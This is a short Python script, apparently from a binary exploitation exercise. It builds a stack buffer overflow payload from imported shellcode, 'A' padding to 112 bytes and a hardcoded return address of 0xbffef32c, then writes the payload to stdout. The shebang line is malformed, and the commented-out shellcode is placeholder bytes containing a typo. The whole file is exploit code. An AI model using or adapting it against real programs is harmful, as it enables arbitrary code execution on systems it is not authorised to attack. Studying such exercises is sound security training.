#/bash/bin/python3
import sys
import struct
from shellcode import shellcode


#shellcode = (
#    b"\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31"
#    b"\x31\x31\x31\x31\x031\x31\x31"
#)
#print(shellcode)
buffer_addr = 0xbffef32c
padding = b'A' * (112 - len(shellcode))

payload = shellcode + padding + struct.pack("<I", buffer_addr)

sys.stdout.buffer.write(payload)
